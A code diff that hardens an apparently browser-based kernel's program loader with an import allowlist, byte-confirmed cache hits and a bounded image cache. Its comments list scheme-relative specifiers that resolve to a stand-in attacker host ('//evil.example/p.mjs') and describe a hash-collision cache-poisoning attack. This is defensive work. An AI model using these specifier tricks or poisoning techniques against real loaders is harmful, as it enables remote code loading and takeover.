@@ -12,7 +12,7 @@
 // browser's network position, and have the kernel EVALUATE the result as a program. That is both
 // the SSRF primitive `src/kernel/providers.mjs` is written to deny — "there is no path by which a
 // process-supplied string becomes a request origin" — and arbitrary remote code load, in the one
-// call that creates processes. Constraint 108 records it.
+// call that creates processes. Constraint 123 records it.
 //
 // So the rule here is the provider table's own rule, applied to programs: the only bytes this
 // kernel will run are bytes it read out of a mounted filesystem. A path is resolved through the
@@ -52,6 +52,20 @@ export const PROGRAM_MAX = 1024 * 1024;
 export const EXEC_CHUNK = MAX_INLINE;
 
 /**
+ * How many bytes of linked program images the kernel keeps.
+ *
+ * A BOUND, and it is a bound on a hostile loop rather than a tuning knob. `PROGRAM_MAX` caps ONE
+ * image and nothing capped their number: a process writing a 1 MiB program to `/tmp` with one byte
+ * varied and spawning it in a loop retained a Blob and a blob URL per iteration — ~1 GiB after a
+ * thousand turns, and the renderer dies and takes every process with it, which is constraint 17's
+ * failure mode reached through storage instead of workers.
+ *
+ * 8 MiB is ~47x the whole of `/usr/bin` as it stands (169 KiB over 14 objects), so no real
+ * workload evicts anything.
+ */
+export const IMAGE_CACHE_BYTES = 8 * 1024 * 1024;
+
+/**
  * The I/O worker's view id for the kernel's own loader buffer.
  *
  * NEGATIVE ON PURPOSE. `src/kernel/iocore.mjs` keys registered SABs by pid, pids are monotonic
@@ -61,48 +75,82 @@ export const EXEC_CHUNK = MAX_INLINE;
 export const EXEC_VIEW_ID = -1;
 
 /**
- * A STATIC, ABSOLUTE import specifier.
+ * THE SPECIFIERS A PROGRAM MAY IMPORT. An ALLOWLIST of exact literals, and nothing else loads.
  *
- * ABSOLUTE ONLY, which is narrower than the page-spawn loader's pattern, and the narrowness is the
- * point. A program's image is a Blob URL with an opaque path, so a RELATIVE specifier inside it has
- * no base to resolve against — and the file the program came from is a filesystem path, not a URL,
- * so there is no sensible base to invent. `/src/abi.mjs` resolves against the document and comes
- * out as the SAME absolute URL `src/libos/process.mjs` already resolved for its own graph, so the
- * dependency is served out of the process's module map rather than off the network.
+ * ======================================================================================
+ * AN ALLOWLIST AND NOT A PATTERN, because a pattern was tried and it leaked. The first version
+ * rewrote any `/…`-shaped specifier through `new URL(specifier, base)` and refused relative ones.
+ * `new URL` RESOLVES A SCHEME-RELATIVE SPECIFIER OFF-ORIGIN — measured against
+ * `http://localhost:8000/www/m5.html`:
  *
- * A program that writes `./x.mjs` therefore keeps the specifier verbatim and fails to load, which
- * is reported as ENOEXEC with the module loader's own message. That is the honest outcome: there
- * is no file for it to mean.
+ *     "//evil.example/p.mjs"    ->  http://evil.example/p.mjs
+ *     "/\\evil.example/p.mjs"   ->  http://evil.example/p.mjs      (a backslash is a slash here)
+ *     "///x"                    ->  http://x/
+ *     "/admin/whatever"         ->  an arbitrary GET on the page's own origin
+ *
+ * and a bare `https://elsewhere/q.mjs` was not matched at all, so it travelled into the Blob
+ * verbatim and the CHILD's module loader fetched it. Four syscalls from any process — write a
+ * program to `/tmp` whose text says `import "//elsewhere/p.mjs"`, chmod it, spawn it — and the
+ * kernel never calls `fetch` while the renderer loads and evaluates remote code on its behalf.
+ * Constraint 123 says what that costs; the loader's own accounting stayed at zero loads, which is
+ * the worst property a security fix can have.
+ *
+ * So: every specifier in the text is extracted and compared against this set by EQUALITY. A
+ * specifier that is not in it is -ENOEXEC with the specifier named. There is no URL construction
+ * on process-controlled text any more — the only strings `new URL` ever sees are the literals
+ * below, which are written here.
+ *
+ * EACH ENTRY MUST ALSO BE IMPORTED BY `src/libos/process.mjs`, which is the other half of the
+ * reason the list is this short: a module no process has already imported would be fetched once
+ * per spawned process, which is the herd `src/kernel/kernel.mjs` measured losing 6 of 480
+ * connections to. Adding a row here without adding the import there buys a fetch per spawn.
+ *
+ * WHAT THIS DOES NOT CLOSE, stated because the gap is invisible otherwise: a DYNAMIC
+ * `import(expr)` whose argument is computed at run time cannot be caught by reading the text, and
+ * no scanner can. The literal forms are caught — `import("…")` goes through the same extraction —
+ * but `import("htt" + "ps://…")` does not. The answer is a Content-Security-Policy on the
+ * document, which bounds what the renderer will fetch whatever the text says; `scripts/serve.py`
+ * sends one, and M6 owns making the process realm unable to reach the network at all
+ * (constraint 41). Recorded as constraint 139.
+ * ======================================================================================
  */
-const ABSOLUTE_SPECIFIER = /(\bfrom\s*|\bimport\s*)(["'])(\/[^"']*)\2/g;
+export const PROGRAM_IMPORTS = Object.freeze(["/src/abi.mjs"]);
 
 /**
- * A RELATIVE path-shaped specifier, which this loader cannot link and REFUSES rather than passes
- * through.
+ * EVERY string literal that follows `from`, `import` or `import(`.
  *
- * MEASURED, and it is why this pattern exists at all. `bench/m4-fs/program.mjs` imported
- * `../../src/abi.mjs`, which the page's URL-based loader resolves and this one cannot. Left
- * verbatim, the blob failed to import inside the child — so every stage of M4's pipelines faulted
- * with SIGABRT and `/proc` said `never issued a syscall`, and 23 expectations in a milestone that
- * was already proved went red with nothing anywhere naming a specifier. A refusal that says
- * "relative specifier `../../src/abi.mjs`" costs one regex and turns that afternoon into a line.
+ * Deliberately broader than the thing being rewritten: the point is to SEE every specifier so an
+ * unknown one can be refused, not to find the ones that match a shape. `import(` is included
+ * because a literal dynamic import is a specifier like any other.
+ *
+ * It over-matches a string that merely follows the word `import` in a comment — and that is the
+ * safe direction: a program whose comment says `import "x"` is refused and says why, where the
+ * reverse would be a specifier nobody checked. Linear: a fixed alternation, `\s*`, then one
+ * non-nested `[^"']*`. No nested quantifier for a hostile program to backtrack.
  */
-const RELATIVE_SPECIFIER = /(?:\bfrom\s*|\bimport\s*)(["'])(\.{1,2}\/[^"']*)\1/;
+const ANY_SPECIFIER = /(\bfrom\s*|\bimport\s*\(?\s*)(["'])([^"']*)\2/g;
 
 /**
- * Rewrite a program's absolute specifiers to absolute URLs. PURE over (text, base).
+ * Link a program: every specifier checked against the allowlist, then rewritten to the absolute
+ * URL the libos already has in its module map. PURE over (text, base).
  *
  * `resolved` is returned rather than assumed so a check can assert the count: a loader that
  * silently stopped rewriting would leave every program importing nothing and failing identically.
+ * `unlinkable` names the FIRST refused specifier, because a refusal that does not say which string
+ * it refused is the afternoon constraint 125 records.
  */
 export function linkProgram(text, base) {
-  const relative = RELATIVE_SPECIFIER.exec(text);
-  if (relative) return { code: null, resolved: 0, unlinkable: relative[2] };
   let resolved = 0;
-  const code = text.replace(ABSOLUTE_SPECIFIER, (all, lead, quote, specifier) => {
+  let unlinkable = "";
+  const code = text.replace(ANY_SPECIFIER, (all, lead, quote, specifier) => {
+    if (!PROGRAM_IMPORTS.includes(specifier)) {
+      if (!unlinkable) unlinkable = specifier;
+      return all;
+    }
     resolved += 1;
     return `${lead}${quote}${new URL(specifier, base).href}${quote}`;
   });
+  if (unlinkable) return { code: null, resolved: 0, unlinkable };
   return { code, resolved, unlinkable: "" };
 }
 
@@ -122,20 +170,58 @@ const DECODER = new TextDecoder("utf-8", { fatal: false });
  */
 export function makeExec(ctx) {
   /**
-   * CONTENT-ADDRESSED, not path-addressed.
+   * CONTENT-ADDRESSED, not path-addressed, and the HASH IS NOT TRUSTED ON ITS OWN.
    *
    * A path key would serve a stale image after the file behind it changed, which is exactly what a
-   * shell writing a program and running it does. Hashing the bytes means two programs with
-   * identical text share one Blob and a rewritten program gets a new one, with no invalidation
-   * logic to get wrong. The Blob is never revoked: a process may still be importing it, and the
-   * kernel's own lifetime is the bound.
+   * shell writing a program and then running it does. Hashing the bytes means a rewritten program
+   * gets a new entry with no invalidation logic to get wrong.
+   *
+   * BUT A HIT IS CONFIRMED BY COMPARING THE BYTES, because FNV-1a-32 is trivially collidable: a
+   * meet-in-the-middle over four tail bytes finds a same-length collision in milliseconds, and the
+   * dangerous direction is POISONING rather than reuse. An unprivileged process writes a 38-byte
+   * file whose hash and length match a program in `/usr/bin`, execs it once, and the Map then holds
+   * its bytes under that key — so a LATER `spawn` of the real program, from any process including
+   * a root shell, runs the attacker's text. The mount, the permission check and the read would all
+   * have behaved correctly and the Map would have decided what ran. The compare is O(n) on a hit
+   * only, and it is exact; the hash is reduced to what it should be, an index.
+   *
+   * The Blob is never revoked while its entry lives: a process may still be importing it, and only
+   * eviction ends that. Eviction is by insertion order and never touches the entry just added.
    */
   const images = new Map();
+  let cachedBytes = 0;
   let loads = 0;
   let cacheHits = 0;
+  let hashCollisions = 0;
+  let evictions = 0;
   let bytesRead = 0;
   let durableReads = 0;
   let durableWaits = 0;
+
+  /** Whether two byte arrays are equal. The whole of what makes a cache hit trustworthy. */
+  function sameBytes(a, b) {
+    if (a.length !== b.length) return false;
+    for (let i = 0; i < a.length; i += 1) if (a[i] !== b[i]) return false;
+    return true;
+  }
+
+  /**
+   * Keep the cache under its ceiling, oldest first, and REVOKE what goes.
+   *
+   * `keep` is the key just inserted and is never evicted: a program is imported by its child
+   * immediately after `spawn` returns, so revoking the entry this load just made would break the
+   * spawn that paid for it.
+   */
+  function evictTo(limit, keep) {
+    for (const [key, image] of images) {
+      if (cachedBytes <= limit) return;
+      if (key === keep) continue;
+      URL.revokeObjectURL(image.imageUrl);
+      images.delete(key);
+      cachedBytes -= image.bytes;
+      evictions += 1;
+    }
+  }
 
   /**
    * THE LOADER BUFFER IS SHARED AND THE READS ARE ASYNC, so they are serialized here.
@@ -178,6 +264,8 @@ export function makeExec(ctx) {
       bytesRead += decision.bytes.length;
       return decision.bytes;
     }
+    // `decision.type !== FILE` is handled by the filesystems themselves: both throw EISDIR for a
+    // directory when `dirOk` is unset, so a caller cannot reach here with one.
     if (decision.tmpfs) {
       const size = at.mount.fs.size(decision.ino);
       if (size > PROGRAM_MAX) return -EFBIG;
@@ -235,34 +323,61 @@ export function makeExec(ctx) {
     d.refs = 1;
     d.pos = 0;
     try {
-      const view = ctx.execView();
-      const parts = [];
-      let total = 0;
-      for (;;) {
-        const n = await store.readFd(d, EXEC_VIEW_ID, 0, EXEC_CHUNK, total);
-        if (n < 0) return n;
-        if (n === 0) break;
-        // COPIED OUT OF THE SHARED VIEW IMMEDIATELY. `slice` on a Uint8Array over a
-        // SharedArrayBuffer returns a non-shared copy; keeping the subarray would alias a buffer
-        // the next chunk overwrites.
-        parts.push(view.slice(0, n));
-        total += n;
-        if (total > PROGRAM_MAX) return -EFBIG;
-      }
-      bytesRead += total;
-      const out = new Uint8Array(total);
-      let off = 0;
-      for (const part of parts) {
-        out.set(part, off);
-        off += part.length;
-      }
-      return out;
+      /* EVERY CHUNK UNDER ONE INODE LOCK, and that is a correctness requirement rather than a
+       * performance choice. `readFd` takes the lock PER CALL, so a two-chunk program read could be
+       * interleaved by another process's `fsync` of the same file: chunk 0 from generation n and
+       * chunk 1 from generation n+1, spliced into a module that exists in no file and then hashed,
+       * cached and run. Linux cannot produce this — the image is pinned and a write to a running
+       * executable is ETXTBSY — and the equivalent here is to hold the inode for the whole read.
+       * `readHeld` is `readFd`'s body without the lock, which is the same pattern store.mjs uses
+       * internally. */
+      return await store.withInode(d.ino, () => readChunks(store, d));
     } finally {
-      // The sync access handle is AN EXCLUSIVE LOCK PER FILE (src/kernel/calls.mjs says what
-      // leaking one costs: the file becomes unopenable by anything for the life of the page). A
-      // throw on the read path must not keep it.
-      await store.closeFd(d);
+      /* `release`, NEVER `closeFd`, and the difference is a durable write.
+       *
+       * `closeFd` runs `commit(d)` on any non-read-only file description, and `commitOnce` with
+       * nothing staged publishes the blob's PHYSICAL extent whenever it exceeds the metadata's
+       * size — which is exactly where another description's un-fsynced append lives. So closing an
+       * exec's description could publish a generation and append a journal record on behalf of a
+       * writer that never called `fsync`: a call documented as a read mutating the volume.
+       *
+       * This description never wrote, so the only thing `openFd` took that has to be given back is
+       * the handle-row reference it `acquire`d — and `release` is that, under the same lock
+       * `openFd` took it under. The sync access handle is AN EXCLUSIVE LOCK PER FILE
+       * (src/kernel/calls.mjs says what leaking one costs: the file becomes unopenable by
+       * anything, by any process, for the life of the page), so this runs on the throw path too.
+       */
+      if (d.type === "file") await store.withInode(d.ino, () => store.release(d.ino));
     }
+  }
+
+  /** The chunk loop, under the caller's inode lock. Positional reads only, so `d.pos` is never
+   *  consulted and no two chunks can disagree about which generation they came from. */
+  async function readChunks(store, d) {
+    const view = ctx.execView();
+    const parts = [];
+    let total = 0;
+    for (;;) {
+      const n = await store.readHeld(d, EXEC_VIEW_ID, 0, EXEC_CHUNK, total);
+      if (n < 0) return n;
+      if (n === 0) break;
+      // COPIED OUT OF THE SHARED VIEW IMMEDIATELY. `slice` on a Uint8Array over a
+      // SharedArrayBuffer returns a non-shared copy; keeping the subarray would alias a buffer
+      // the next chunk overwrites.
+      parts.push(view.slice(0, n));
+      total += n;
+      // COUNTED BEFORE THE REFUSAL, so the counter does not go blind on exactly the path a check
+      // would want to measure.
+      bytesRead += n;
+      if (total > PROGRAM_MAX) return -EFBIG;
+    }
+    const out = new Uint8Array(total);
+    let off = 0;
+    for (const part of parts) {
+      out.set(part, off);
+      off += part.length;
+    }
+    return out;
   }
 
   return {
@@ -284,8 +399,21 @@ export function makeExec(ctx) {
       const key = `${hash}:${bytes.length}`;
       const cached = images.get(key);
       if (cached) {
-        cacheHits += 1;
-        return { ...cached, url: path, reused: true };
+        // THE HIT IS CONFIRMED AGAINST THE BYTES. A matching hash and length is an index, not an
+        // identity: FNV-1a-32 collides on demand, and a process that poisons this entry would
+        // otherwise choose the code another process runs. A collision is counted and the loader
+        // simply links the real bytes instead — the cache is an optimisation, so losing it costs a
+        // Blob and nothing else.
+        if (sameBytes(cached.source, bytes)) {
+          cacheHits += 1;
+          return { ...cached, source: undefined, url: path, reused: true };
+        }
+        hashCollisions += 1;
+        if (ctx.note) {
+          ctx.note(`exec ${path}: a cached image has this content hash and different bytes; `
+            + "linking the file's own bytes. A deliberate collision is cheap against FNV-1a, so "
+            + "this is a refusal to trust the hash and not a storage fault");
+        }
       }
       let text;
       try {
@@ -307,19 +435,35 @@ export function makeExec(ctx) {
       const image = {
         url: path,
         imageUrl: URL.createObjectURL(new Blob([code], { type: "text/javascript" })),
+        // THE BYTES, kept so a later hit can be confirmed rather than believed. This is what the
+        // cache ceiling is counted against.
+        source: bytes,
         bytes: bytes.length,
         resolved,
         hash,
       };
       images.set(key, image);
+      cachedBytes += image.bytes;
       loads += 1;
-      return { ...image, reused: false };
+      // THE CEILING IS ENFORCED AFTER THE INSERT, never before, so the entry this load just made
+      // is the one entry eviction may not take — its child is about to import it.
+      evictTo(IMAGE_CACHE_BYTES, key);
+      // `source` is the cache's copy and is not part of what a caller is handed: a spawn does not
+      // need the program text, and returning it would put a megabyte in a message.
+      return { ...image, source: undefined, reused: false };
     },
 
     /** The loader's own counters, so "the program crossed the wire zero times" is a measurement.
      *  `fetches` is absent deliberately: there is no fetch in this file to count. */
     stats() {
-      return { images: images.size, loads, cacheHits, bytesRead, durableReads, durableWaits };
+      return {
+        images: images.size, cachedBytes, loads, cacheHits, bytesRead,
+        durableReads, durableWaits,
+        // BOTH REFUSAL COUNTERS ARE PUBLISHED, because each is a security property that is
+        // invisible when it holds: a hash collision the loader declined to trust, and an image the
+        // ceiling evicted rather than retaining without bound.
+        hashCollisions, evictions,
+      };
     },
   };
 }
